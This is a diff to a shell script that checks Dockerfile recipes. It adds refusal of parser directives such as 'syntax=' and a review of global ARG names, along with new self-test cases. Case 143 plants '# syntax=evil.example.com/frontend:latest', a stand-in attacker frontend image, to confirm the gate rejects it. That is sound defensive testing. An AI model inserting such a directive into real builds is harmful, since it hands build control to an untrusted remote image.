@@ -35,7 +35,7 @@ GUARDED_DATA='chrome-devtools/data/chrome-devtools-mcp.sigstore.json chrome-devt
 # complete 1..N sequence before any case runs, so a duplicated, skipped or
 # appended label fails instead of silently not running (81 labels were defined
 # while the loop stopped at 79).
-SELF_TEST_CASES=142
+SELF_TEST_CASES=145
 fail() { echo "$*" >&2; exit 1; }
 usage() { echo "usage: example-layers.sh [--self-test | --root DIR]" >&2; exit 2; }
 checksum_token() {
@@ -45,8 +45,20 @@ checksum_token() {
 # expansion or general Dockerfile validation. Heredoc words must be simple;
 # quoted/escaped shell context before an operator is unsupported, not guessed.
 # Fast drift guard limits: no full quoted heredoc delimiter grammar, distinction
-# of heredoc-looking LABEL/ENV values, escaped-backslash boundaries, or Docker
-# directive cutoff after an ordinary comment (only after an instruction).
+# of heredoc-looking LABEL/ENV values, escaped-backslash boundaries, or a repeated
+# escape directive.
+#
+# Parser directives are the exception to "no general Dockerfile validation", and
+# the only part of this reading that is a build verdict rather than a shape
+# check. BuildKit reads a directive only before the first comment, empty line or
+# instruction, and `syntax=` replaces the frontend that reads every later line:
+# it would pull an unreviewed image that defeats the FROM pins, `--network=none`
+# and the stage allowlist at once (#235). So `escape` is the one directive this
+# file honours, every other directive is refused by name, and a directive outside
+# that leading window is refused instead of skipped as a comment - BuildKit treats
+# it as a comment there, and a gate that honoured one anyway would be reporting on
+# a parse the build never makes. A directive-shaped comment whose key BuildKit
+# does not know (`# GOTOOLCHAIN=local ...`) stays a comment, as it is to BuildKit.
 logical_instructions() {
     awk -v example="$2" -v quote="'" '
         function reject(message) {
@@ -91,15 +103,25 @@ logical_instructions() {
                 if (data == terminator[body]) body++
                 next
             }
-            if (leading && $0 ~ /^[ \t]*#[ \t]*[Ee][Ss][Cc][Aa][Pp][Ee][ \t]*=/) {
+            if ($0 ~ /^[ \t]*#[ \t]*[A-Za-z][A-Za-z0-9]*[ \t]*=/) {
+                key=$0
+                sub(/^[^#]*#[ \t]*/, "", key)
+                sub(/[ \t]*=.*$/, "", key)
+                key=tolower(key)
+                if (!leading) {
+                    if (key != "escape" && key != "syntax" && key != "check") next
+                    reject("parser directive outside the leading window: " key " (BuildKit stops reading directives at the first comment, empty line or instruction)")
+                }
+                if (key != "escape")
+                    reject("unsupported parser directive: " key " (only escape is reviewed: syntax= replaces the frontend that reads this recipe)")
                 directive=$0
                 sub(/^[^=]*=[ \t]*/, "", directive)
                 sub(/[ \t]+$/, "", directive)
-                if (directive != "\\" && directive != "`") reject("unsupported escape directive")
+                if (directive != "\\" && directive != "`") reject("unsupported escape directive: " directive)
                 escape=directive
                 next
             }
-            if ($0 ~ /^[ \t]*(#|$)/) next
+            if ($0 ~ /^[ \t]*(#|$)/) { leading=0; next }
             leading=0
             continued=(substr($0, length($0), 1) == escape)
             line=line (continued ? substr($0, 1, length($0)-1) : $0)
@@ -114,6 +136,59 @@ logical_instructions() {
             if (continued) reject("unsupported unterminated continuation")
         }
     ' "$1"
+}
+# The ARG names each example declares today, whole file, frozen here (#235): an
+# ARG is one more build-time input to a recipe whose pins are reviewed as bytes,
+# so a new name is a review, not an edit. Whole file and not per stage, because
+# the question is whether the recipe has ever named the input; which stage reads
+# it is a separate rule (rust-dev's closed instruction set below). The set is
+# checked in both directions, so a name dropped from a recipe cannot leave a
+# stale permission behind.
+reviewed_args() { # EXAMPLE
+    case $1 in
+        chrome-devtools) printf '%s\n' BASE_IMAGE ;;
+        go-dev) printf '%s\n' BASE_IMAGE GO_VERSION GO_AMD64_SHA256 GO_ARM64_SHA256 \
+            GOLANGCI_LINT_VERSION GOLANGCI_LINT_AMD64_SHA256 GOLANGCI_LINT_ARM64_SHA256 \
+            GOPLS_VERSION GO_PREFIX GO_TOOLS_BIN ;;
+        rust-dev) printf '%s\n' BASE_IMAGE RUST_TOOLCHAIN VERUS_RELEASE VERUS_SHA256 \
+            KACHE_VERSION KACHE_AMD64_SHA256 KACHE_ARM64_SHA256 KACHE_RELEASE_CERT_SHA256 \
+            RUSTUP_HOME CARGO_HOME KACHE_DIR VERUS_DIR ;;
+        wirenboard-cpp) printf '%s\n' BASE_IMAGE ;;
+        *) return 1 ;;
+    esac
+}
+# A global ARG is the one instruction that can precede FROM, so it reaches the
+# parent line while every other instruction check looks after it. The reviewed
+# set is what refuses a new one by name.
+review_args() { # EXAMPLE INSTRUCTIONS
+    local example=$1 instructions=$2 reviewed
+    reviewed=$(reviewed_args "$example") || fail "ARG review: $example has no reviewed ARG set"
+    printf '%s\n' "$instructions" | REVIEWED_ARGS=$reviewed awk -v example="$example" '
+        function reject(message) {
+            print "ARG review: " message > "/dev/stderr"
+            failed=1
+            exit 1
+        }
+        BEGIN {
+            for (i = 1; i <= split(ENVIRON["REVIEWED_ARGS"], names, "\n"); i++) reviewed_name[names[i]]=1
+        }
+        toupper($0) ~ /^[[:space:]]*FROM([[:space:]]|$)/ { stage=1 }
+        toupper($1) == "ARG" {
+            for (i = 2; i <= NF; i++) {
+                name=$i
+                sub(/=.*$/, "", name)
+                declared[name]=1
+                if (!stage && !(name in reviewed_name))
+                    reject(example " declares an unreviewed global ARG: " name)
+            }
+        }
+        END {
+            if (failed) exit 1
+            for (name in reviewed_name)
+                if (!(name in declared))
+                    reject(example " no longer declares the reviewed ARG " name)
+        }
+    '
 }
 check() {
     [ -d "$ROOT" ] && [ -r "$ROOT" ] && [ -x "$ROOT" ] || fail "root missing: $ROOT"
@@ -155,6 +230,7 @@ check() {
         else
             printf '%s\n' "$instructions" | awk 'toupper($0) ~ /^[[:space:]]*FROM([[:space:]]|$)/ { found=1; if ($0 != "FROM ${BASE_IMAGE}") bad=1 } END { exit (!found || bad) }' || fail "parent pin: FROM shape: $example"
         fi
+        review_args "$example" "$instructions"
     done
     refs=$(grep -rhoE 'ghcr\.io/gregwebs/agent-vm-standard[^[:space:]`"]*' "$LAYERS" | sort -u)
     [[ "$refs" =~ ^ghcr\.io/gregwebs/agent-vm-standard@sha256:[0-9a-f]{64}$ ]] || fail 'parent pin: references disagree'
@@ -1261,6 +1337,25 @@ INSTRUCTION
             142) insert_builder_instruction "$rustdocker" \
                     'FROM golang:1.27.3-trixie@sha256:fbb7ae40b62ff8afe31662df570d39b4f5052ac32b90dae8e60d7657a20a74f4 AS rust-dev-helper'
                 expected='parent pin: FROM shape: rust-dev must carry exactly the helper stage and the parent' ;;
+            # 143-145: parser directives and the global ARG set (#235). Each case is
+            # the mutation that passed every gate before its rule existed: an
+            # unreviewed frontend, an escape directive BuildKit ignores where the
+            # gate honoured it, and a top-level ARG the recipe never named.
+            143)
+                { printf '# syntax=evil.example.com/frontend:latest\n'; cat "$rustdocker"; } > "$SCRATCH/rewrite"
+                cat "$SCRATCH/rewrite" > "$rustdocker"
+                expected='parent pin: unsupported parser directive: syntax' ;;
+            144)
+                # Before the rule, `leading` survived the ordinary comment, so the
+                # gate read the backtick continuations while BuildKit read `\`.
+                { printf '# An ordinary comment\n# escape=`\n'; sed 's/\\$/`/' "$godocker"; } > "$SCRATCH/rewrite"
+                cat "$SCRATCH/rewrite" > "$godocker"
+                expected='parent pin: parser directive outside the leading window: escape' ;;
+            145)
+                awk '/^ARG BASE_IMAGE=/ { print; print "ARG GOFLAGS=-tags=example_fixture"; next } { print }' \
+                    "$godocker" > "$SCRATCH/rewrite"
+                cat "$SCRATCH/rewrite" > "$godocker"
+                expected='ARG review: go-dev declares an unreviewed global ARG: GOFLAGS' ;;
             # SELF_TEST_TABLE_END
             *) fail "case $n: not in the case table" ;;
         esac
